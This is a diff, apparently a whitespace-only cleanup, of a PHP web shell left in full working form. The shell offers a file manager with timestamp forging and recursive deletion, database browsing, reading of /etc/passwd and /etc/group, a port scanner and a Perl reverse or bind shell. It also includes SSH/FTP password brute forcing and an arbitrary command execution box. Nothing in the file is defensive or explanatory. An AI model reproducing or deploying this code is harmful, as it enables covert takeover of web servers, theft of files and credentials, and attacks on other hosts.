@@ -1,4 +1,3 @@
-
 <?php
 @ini_set('log_errors_max_len',0);
 @ini_restore('log_errors');
@@ -57,7 +56,6 @@ class zc
             if(@is_dir($v))$this->ad($v,$v);elseif(@is_file($v))$this->af($v,$v);
         }
 
-
     }
 
     function ad($p,$n){
@@ -67,7 +65,6 @@ class zc
             }
             @closedir($d);
         }
-
 
     }
 
@@ -140,8 +137,6 @@ class zc
         }
         return $s;
     }
-
-
 }
 
 class sc
@@ -165,7 +160,6 @@ class sc
         switch($this->tp){
             case 'mysql': @mysql_select_db($n,$this->cl);break;case 'mssql': @mssql_select_db($n,$this->cl);break;case 'pg': @pg_close($this->cl);$this->cl=@pg_connect($this->cs.' dbname='.$n);break;
         }
-
 
     }
 
@@ -205,7 +199,6 @@ class sc
                 break;case 'mssql': $t=explode('.',$t, 2);$r=@mssql_query('SELECT COUNT(*) FROM ['.$d.'].['.$t[0].'].['.$t[1].']',$this->cl);return (int)@mssql_result($r, 0, 0);break;case 'pg': $t=explode('.',$t, 2);if(!$r=@pg_query($this->cl, 'SELECT n_live_tup FROM "'.$d.'"."pg_catalog"."pg_stat_all_tables" WHERE schemaname=\''.$t[0].'\' AND relname=\''.$t[1].'\''))$r=@pg_query($this->cl, 'SELECT COUNT(*) FROM "'.$d.'"."'.$t[0].'"."'.$t[1].'"');return (int)@pg_fetch_result($r, 0, 0);break;
         }
 
-
     }
 
     function fv($o,$r=NULL){
@@ -224,7 +217,6 @@ class sc
         switch($this->tp){
             case 'mysql': return @mysql_error($this->cl);break;case 'mssql': return @mssql_get_last_message();break;case 'pg': return @pg_last_error($this->cl);break;
         }
-
 
     }
 
@@ -252,16 +244,12 @@ class sc
             break;
         }
 
-
     }
 
     function cl(){
         $f=$this->tp.'_close'; @$f($this->cl);
     }
-
-
 }
-
 
 if(isset($_POST['fdw']) || isset($_POST['fdwa']))
 {
@@ -279,8 +267,6 @@ elseif(isset($_POST['fdw'])){
     header('Last-Modified: '.gmdate('D, d M Y H:i:s').' GMT');
     @readfile($_POST['fdw']);die();
 }
-
-
 }
 
 if(isset($_POST['sdd']) && !empty($_POST['cd']))
@@ -309,9 +295,7 @@ if(isset($_POST['sdt']) && !empty($_POST['ct']))
             echo $s;
         }
 
-
     }
-
 
     $e=new ce();
     @session_start();
@@ -326,7 +310,6 @@ if(isset($_POST['sdt']) && !empty($_POST['ct']))
 }
     die();
 }
-
 
 function mt(){
     list($usec,$sec)=explode(' ', microtime());return ((float)$usec+(float)$sec);
@@ -345,7 +328,6 @@ if(IW)$_SESSION['CP']=str_replace('\\', '/',$_SESSION['CP']);if(substr($_SESSION
             $v=explode(':',$v);$ui[ $v[2] ]=$v[0];
         }
 
-
     }
     if(@is_readable('/etc/group')){
         $a=file('/etc/group');
@@ -353,10 +335,7 @@ if(IW)$_SESSION['CP']=str_replace('\\', '/',$_SESSION['CP']);if(substr($_SESSION
             $v=explode(':',$v);$gi[ $v[2] ]=$v[0];
         }
 
-
     }
-
-
 }
 
 function sm($m,$t){
@@ -393,7 +372,7 @@ function se($c){
     echo escHTML(@ob_get_clean());
 }
 @header("Content-Type: text/html; charset=".$_SESSION['CS']);?>
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"/><html> <head> <meta http-equiv="Content-Type" content="text/html; charset=
+    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"/><html> <head> <meta http-equiv="Content-Type" content="text/html; charset=
 <?php echo $_SESSION['CS'];?>
 "/> <title>
         <?php echo escHTML($_SERVER['SERVER_NAME']);?>
@@ -586,7 +565,6 @@ function se($c){
                 if(cb.elements[i].type=='checkbox') cb.elements[i].checked=v;
             }
 
-
         }
     </script> </head><body> <fieldset class="head"><table class="head"> <tr><th style="width:125px">Server address :</th><td>
                 <?php if(!empty($_SERVER['SERVER_NAME']))echo ($_SERVER['HTTP_HOST']==$_SERVER['SERVER_NAME'])?$_SERVER['SERVER_NAME']:$_SERVER['HTTP_HOST'].' on '.$_SERVER['SERVER_NAME']; else echo $_SERVER['HTTP_HOST'];$i=@gethostbyname($_SERVER['HTTP_HOST']);if(!empty($_SERVER['SERVER_ADDR']))echo ' (', ($_SERVER['SERVER_ADDR']==$i)?$_SERVER['SERVER_ADDR']:$i.', '.$_SERVER['SERVER_ADDR'], ')'; elseif(!empty($i))echo ' (',$i,')';
@@ -628,7 +606,6 @@ function se($c){
 <?php if(isset($_POST['fe']) || isset($_POST['fs'])){
     if(!empty($_POST['fd']) || isset($_POST['fda'])){
 
-
         function dd($p){
             $p=@realpath($p);$d=@opendir($p);while( FALSE !==($f=@readdir($d)))if($f!='.' && $f!='..' ){
                 if(is_dir($p.DIRECTORY_SEPARATOR.$f)) dd($p.DIRECTORY_SEPARATOR.$f);else @unlink($p.DIRECTORY_SEPARATOR.$f);
@@ -650,7 +627,6 @@ function se($c){
                 if(!empty($_SESSION['CO'][$p])) unset($_SESSION['CO'][$p]);$_SESSION['MO'][$p]=1;
             }
 
-
         }
         if(isset($_POST['fma']) && !empty($_POST['fc'])) foreach($_POST['fc'] as $f) aml($f);elseif(!empty($_POST['fm'])) aml($_POST['fm']);
     }
@@ -660,7 +636,6 @@ function se($c){
             $p=str_rot13($p);if(!empty($_SESSION['CO'][$p])) unset($_SESSION['CO'][$p]);else{
                 if(!empty($_SESSION['MO'][$p])) unset($_SESSION['MO'][$p]);$_SESSION['CO'][$p]=1;
             }
-
 
         }
         if(isset($_POST['fca']) && !empty($_POST['fc'])) foreach($_POST['fc'] as $f) acl($f);elseif(!empty($_POST['fcf'])) acl($_POST['fcf']);
@@ -677,14 +652,12 @@ function se($c){
                             @touch($p.DIRECTORY_SEPARATOR.$f,$sf[9],$sf[8]);
                         }
 
-
                     }
                     @closedir($h);
                     @touch($n,$s[9],$s[8]);
                 }
                 @touch($d,$sd[9],$sd[8]);
             }
-
 
         }
         $s=@stat($_SESSION['CP']);if(!empty($_SESSION['MO'])){
@@ -703,7 +676,6 @@ function se($c){
                     @copy($v,$t);
                     @touch($t,$sv[9],$sv[8]);
                 }
-
 
             }
             unset($_SESSION['CO']);
@@ -738,7 +710,6 @@ function se($c){
             @touch($_SESSION['CP'].$v,$s[9],$s[8]);
             @touch($_SESSION['CP'],$s[9],$s[8]);
         }
-
 
     }
     if(isset($_POST['fef'])){
@@ -804,7 +775,6 @@ function se($c){
     <?php
     }
 
-
     }
     else sm('Can\'t read this file. Sorry.', 'e');
     }
@@ -859,14 +829,11 @@ function se($c){
                             @fclose($f);
                         }
 
-
                     }
                     else $a[]=array($v,$v, '', 1);
                 }
 
-
             }
-
 
         }
         if($t=@glob($p.'*', GLOB_ONLYDIR)) foreach($t as $v) gs($v,$n,$a);
@@ -883,7 +850,6 @@ function se($c){
             foreach($p as $v) gs($v,$n,$a);
         }
 
-
     }
     else{
         if(@is_readable($_SESSION['CP'])){
@@ -898,12 +864,10 @@ function se($c){
                     $a[]=array($p,$v, '', 1);
                 }
 
-
             }
             @closedir($d);
             @uasort($a, cn);
         }
-
 
     }
     if(!empty($a)){
@@ -970,12 +934,9 @@ px">Modified</th><th width="140px">Owner</th><th width="55px">Perms</th><th widt
     <?php
     }
 
-
     }
     elseif(!isset($_POST['fs']) || isset($_POST['fsn'])) sm('Can\'t find any file. Sorry.', 'e');
     }
-
-
 }
 elseif(isset($_POST['se'])){
     $c=array('tp'=>'', 'ha'=>'localhost', 'hp'=>'', 'un'=>'', 'up'=>'', 'db'=>'');if(isset($_POST['sc']))$c=$_POST['sc']; elseif(isset($_SESSION['DB']))$c=$_SESSION['DB'];if(isset($_POST['sd'])){
@@ -1063,9 +1024,7 @@ elseif(isset($_POST['se'])){
                             <?php
                             }
 
-
                         }
-
 
                     }
                     else sm($s->e(), 'e');
@@ -1078,10 +1037,7 @@ elseif(isset($_POST['se'])){
             if(isset($_SESSION['DB'])) unset($_SESSION['DB']);sm('Can\'t connect. '.$s->e(), 'e');
         }
 
-
     }
-
-
 }
 elseif(isset($_POST['nt'])){
     $pf=empty($_POST['pf'])?0:$_POST['pf'];$pl=empty($_POST['pl'])?65535:$_POST['pl'];$sc=empty($_POST['sc'])?50:$_POST['sc'];?>
@@ -1154,9 +1110,7 @@ open(STDIN, "<&CONN");open(STDOUT, ">&CONN");open(STDERR, ">&CONN");'.$l4.'close
                             @socket_close($sh);unset($se[$sn],$ss[$sh]);
                         }
 
-
                     }
-
 
                 }
                 echo '</table>';
@@ -1285,7 +1239,6 @@ elseif(isset($_POST['br'])){
                         echo '<tr class="',$b?'ok':'fail', '"><td>SSH</td><td>',escHTML($l),'</td><td>',escHTML($k),'</td><td>',$b?'OK':'FAILED','</td></tr>'; flush();if($b)break; else @usleep(500);
                     }
 
-
                 }
                     break;case 'f': $b=FALSE; foreach($c as $k)if($r=@ftp_connect($f['ha'],$f['hp'])){
                     if(@ftp_login($r,$l,$k))$b=TRUE;
@@ -1315,9 +1268,7 @@ elseif(isset($_POST['br'])){
                     break;
             }
 
-
         }
-
 
     }
 
@@ -1360,7 +1311,6 @@ font-size:12px
             echo '<div class="php">',$is,$i, '</div>';
         }
 
-
     }
     ?>
     <fieldset style='font:normal 12px "Courier New"'><form action="" method="post" style="margin-bottom:5px;">Exec : <input type="text" name="ex" value="
@@ -1380,7 +1330,6 @@ font-size:12px
                             foreach($e as $i)if(isset($_POST[$i])){
                                 echo '<input type="hidden" name="'.$i.'"/>'; break;
                             }
-
 
                         }
                         ?>
